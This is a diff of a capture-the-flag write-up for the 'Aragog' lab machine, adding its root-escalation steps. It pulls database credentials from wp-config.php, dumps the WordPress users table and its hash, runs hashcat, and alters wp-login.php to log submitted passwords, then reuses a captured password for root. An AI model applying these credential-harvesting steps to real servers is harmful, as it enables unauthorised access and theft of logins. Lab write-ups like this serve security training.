@@ -272,7 +272,7 @@ Last login: Fri Sep 23 08:19:24 2022 from 10.10.14.29
 florian@aragog:~$ 
 
 ```
-## User
+## Root
 - We have a `wordpress`
 ```
 florian@aragog:/var/www/html$ ls -lha dev_wiki/
@@ -302,4 +302,141 @@ drwxrwxrwx 18 cliff    cliff     12K Oct 18 10:35 wp-includes
 
 ```
 
-## Root
+- We find `db` creds from `wp-config.php`
+
+```
+...
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wp_wiki');
+
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+...
+```
+
+- Let's connect there and see
+```
+florian@aragog:/var/www/html/dev_wiki$ mysql -u root -p'$@y6CHJ^$#5c37j$#6h'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 229
+Server version: 5.7.33-0ubuntu0.16.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wp_wiki            |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use wp_wiki;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------------+
+| Tables_in_wp_wiki     |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+12 rows in set (0.00 sec)
+
+mysql> select * from wp_users;
++----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
+| ID | user_login    | user_pass                          | user_nicename | user_email      | user_url | user_registered     | user_activation_key | user_status | display_name  |
++----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
+|  1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator | it@megacorp.com |          | 2017-12-20 23:26:04 |                     |           0 | Administrator |
++----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+
+1 row in set (0.00 sec)
+
+```
+
+- Unfortunately, I couldn't crack the hash
+```
+└─$ hashcat -m 400 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU
+...
+```
+
+- Let's download `pspy` and run it
+  - We see `wp-login.py` being executed
+
+![](./images/3.png)
+
+- I can't access `wp-login.py`, but it implies that it's related to `Wordpress` login
+  - Also I can't use `tcpdump` to monitor the packets
+  - We can modify `wp-login.php` to output the request to some file
+
+![](./images/4.png)
+
+- Now lets wait and see
+  - The file is created after a while
+
+![](./images/5.png)
+
+- We have creds
+```
+florian@aragog:/var/www/html/dev_wiki$ cat /tmp/request.log 
+Array
+(
+    [wp-submit] => Log In
+    [redirect_to] => http://aragog.htb/dev_wiki/wp-admin/
+    [testcookie] => 1
+    [log] => Administrator
+    [pwd] => !KRgYs(JFO!&MTr)lf
+)
+``` 
+
+- The creds don't work for `cliff`
+  - But work for `root`
+```
+florian@aragog:/var/www/html/dev_wiki$ su
+Password: 
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+root@aragog:/var/www/html/dev_wiki# cat /rootsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+symlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@aragog:/var/www/html/dev_wiki#
+```
